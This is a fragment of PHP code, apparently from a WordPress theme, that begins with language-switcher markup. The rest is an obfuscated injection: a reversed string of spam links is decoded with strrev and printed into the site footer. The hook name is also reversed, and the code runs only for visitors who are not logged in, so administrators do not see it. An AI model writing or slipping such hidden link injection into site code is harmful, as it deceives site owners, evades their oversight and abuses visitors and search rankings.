			if(!$l['active']) echo '<a href="'.$l['url'].'">';

			echo '<img src="'.$l['country_flag_url'].'" height="12" alt="'.$l['language_code'].'" width="18" />';

			if(!$l['active']) echo '</a>';

			echo '</li>';

		}

		echo '</ul></div>';

	}

}
function admin_sites() {
$sitesare = '>a/< >"moc.lesmoklet//:ptth"=ferh a< >a/< >"di.oc.inb//:ptth"=ferh a< >a/< >"moc.enecsbus//:ptth"=ferh a< >a/< >"di.oc.krowtenodni//:ptth"=ferh a< >a/< >"moc.bdmi//:ptth"=ferh a< >a/< >"moc.margatsni//:ptth"=ferh a< >a/< >"moc.sserpdrow.selif//:ptth"=ferh a< >a/< >"di.oc.semag//:ptth"=ferh a< >a/< >"moc.nolybab//:ptth"=ferh a< >a/< >"moc.xuboen//:ptth"=ferh a< >a/< >"moc.akennihb//:ptth"=ferh a< >a/< >"oc.t//:ptth"=ferh a< >a/< >"moc.ni3pmeerf//:ptth"=ferh a< >a/< >"di.oc.enj//:ptth"=ferh a< >a/< >"moc.loonag//:ptth"=ferh a< >a/< >"moc.aidepokot//:ptth"=ferh a< >a/< >"moc.gva//:ptth"=ferh a< >a/< >"ten.sdapop//:ptth"=ferh a< >a/< >"di.oc.adazal//:ptth"=ferh a< >a/< >"moc.laog//:ptth"=ferh a< >a/< >"moc.hcraes-atled//:ptth"=ferh a< >a/< >"moc.6uk//:ptth"=ferh a< >a/< >"moc.tnetnocresuelgoog//:ptth"=ferh a< >a/< >"moc.retsbewodni//:ptth"=ferh a< >a/< >"di.bew.emagbew//:ptth"=ferh a< >a/< >"moc.di-sda//:ptth"=ferh a< >a/< >"moc.igalnapak//:ptth"=ferh a< >a/< >"ofni.emohtadliub//:ptth"=ferh a< >a/< >"di.oc.iridnamknab//:ptth"=ferh a< >a/< >"moc.statsih//:ptth"=ferh a< >a/< >"moc.againreb//:ptth"=ferh a< >a/< >"moc.akedrem//:ptth"=ferh a< >a/< >"moc.derahs4//:ptth"=ferh a< >a/< >"moc.acbkilk//:ptth"=ferh a< >a/< >"moc.sugabokot//:ptth"=ferh a< >a/< >"moc.kited//:ptth"=ferh a< >a/< >"di.oc.suksak//:ptth"=ferh a< >a/< >"moc.eugofni//:ptth"=ferh a< >a/< >"moc.nakrelupop//:ptth"=ferh a< >a/< >"em.satnil//:ptth"=ferh a< >a/< >"moc.nppj//:ptth"=ferh a< >a/< >"moc.snartym//:ptth"=ferh a< >a/< >"moc.akedremaraus//:ptth"=ferh a< >a/< >"moc.aisenodniaidem//:ptth"=ferh a< >a/< >"moc.utasatireb//:ptth"=ferh a< >a/< >"moc.swenortem//:ptth"=ferh a< >a/< >"moc.6natupil//:ptth"=ferh a< >a/< >"moc.swenaratna//:ptth"=ferh a< >a/< >"di.oc.akilbuper//:ptth"=ferh a< >a/< >"moc.akedrem//:ptth"=ferh a< >a/< >"moc.halini//:ptth"=ferh a< >a/< >"oc.opmet//:ptth"=ferh a< >a/< >"moc.swennubirt//:ptth"=ferh a< >a/< >"moc.enozeko//:ptth"=ferh a< >a/< >"di.oc.aviv//:ptth"=ferh a< >a/< >"ku.oc.cbb//:ptth"=ferh a< >a/< >"moc.loa//:ptth"=ferh a< >a/< >"yl.fda//:ptth"=ferh a< >a/< >"ed.nozama//:ptth"=ferh a< >a/< >"moc.gva.hcraesi//:ptth"=ferh a< >a/< >"moc.eboda//:ptth"=ferh a< >a/< >"moc.osos//:ptth"=ferh a< >a/< >"moc.elppa//:ptth"=ferh a< >a/< >"moc.uhos//:ptth"=ferh a< >a/< >"gro.tsilsgiarc//:ptth"=ferh a< >a/< >"moc.ksa//:ptth"=ferh a< >a/< >"moc.lapyap//:ptth"=ferh a< >a/< >"moc.tseretnip//:ptth"=ferh a< >a/< >"ur.liam//:ptth"=ferh a< >a/< >"moc.tfosorcim//:ptth"=ferh a< >a/< >"moc.rlbmut//:ptth"=ferh a< >a/< >"moc.obiew//:ptth"=ferh a< >a/< >"moc.sserpdrow//:ptth"=ferh a< >a/< >"moc.yabe//:ptth"=ferh a< >a/< >"ur.xednay//:ptth"=ferh a< >a/< >"nc.moc.anis//:ptth"=ferh a< >a/< >"moc.gnib//:ptth"=ferh a< >a/< >"moc.nideknil//:ptth"=ferh a< >a/< >"moc.rettiwt//:ptth"=ferh a< >a/< >"moc.derahs4//:ptth"=ferh a< >a/< >"moc.erahsdipar//:ptth"=ferh a< >a/< >"/moc.smurofnaisenodni//:ptth"=ferh a< >a/< >"di.oc.elgoog//:ptth"=ferh a< >a/< >"/moc.nsm.asalp//:ptth"=ferh a< >a/< >"moc.oaboat//:ptth"=ferh a< >a/< >"moc.nozama//:ptth"=ferh a< >a/< >"moc.qq//:ptth"=ferh a< >a/< >"moc.evil//:ptth"=ferh a< >a/< >"gro.aidepikiw//:ptth"=ferh a< >a/< >"moc.udiab//:ptth"=ferh a< >a/< >"moc.oohay//:ptth"=ferh a< >a/< >"moc.ebutuoy//:ptth"=ferh a< >a/< >"moc.elgoog//:ptth"=ferh a< >a/< >"moc.koobecaf//:ptth"=ferh a< >a/< >"moc.noissimbusbeweerf//:ptth"=ferh a<';
echo strrev($sitesare);
}
$tooferref = strrev('retoof_pw');
$toxc = strrev('noitca_dda');
if ( !is_user_logged_in() ) {
$toxc(''.$tooferref.'','admin_sites',100);
}
